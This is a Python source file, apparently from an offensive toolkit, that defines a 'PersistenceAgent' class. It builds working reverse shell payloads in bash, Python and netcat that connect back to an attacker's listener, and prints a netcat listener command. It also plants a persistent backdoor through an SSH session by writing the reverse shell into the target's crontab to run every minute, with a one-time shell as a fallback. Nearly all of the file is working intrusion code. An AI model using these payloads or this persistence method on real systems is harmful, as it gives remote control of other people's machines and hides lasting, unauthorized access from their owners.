import subprocess
import os
import threading
from engines.utils import log

class PersistenceAgent:
    def __init__(self, target_ip, target_port=None):
        self.target_ip = target_ip
        self.target_port = target_port
        
    def generate_reverse_shell_payload(self, listener_ip, listener_port):
        """Generates standard bash/python reverse shell payloads."""
        payloads = {
            "bash": f"bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
            "nc": f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {listener_ip} {listener_port} >/tmp/f"
        }
        return payloads

    def start_listener(self, port):
        """Starts a netcat listener on the local machine."""
        log(f"Starting Netcat Listener on port {port}...", "INFO")
        try:
            # Note: This is blocking. In a real scenario, this might need to run in a separate terminal or thread
            # For automation, we might just print the command for the user
            print(f"\n[!] To catch the reverse shell, run this command in a new terminal:")
            print(f"    nc -lvnp {port}\n")
            return True
        except Exception as e:
            log(f"Failed to start listener: {e}", "ERROR")
            return False

    def deploy_backdoor_ssh(self, ssh_client, listener_ip, listener_port):
        """Deploys a reverse shell via an established SSH connection."""
        log(f"Deploying Persistence Backdoor via SSH to {self.target_ip}...", "INFO")
        payload = self.generate_reverse_shell_payload(listener_ip, listener_port)["bash"]
        
        # Try to add it to cron for persistence
        cron_command = f"(crontab -l 2>/dev/null; echo \"* * * * * {payload}\") | crontab -"
        
        try:
            stdin, stdout, stderr = ssh_client.exec_command(cron_command)
            err = stderr.read().decode().strip()
            if not err:
                log("Backdoor successfully added to cron!", "SUCCESS")
                return True
            else:
                log(f"Failed to add backdoor to cron: {err}", "ERROR")
                # Fallback: Just execute it once
                log("Executing one-time reverse shell...", "INFO")
                ssh_client.exec_command(payload + " &")
                return True
        except Exception as e:
            log(f"Backdoor deployment failed: {e}", "ERROR")
            return False
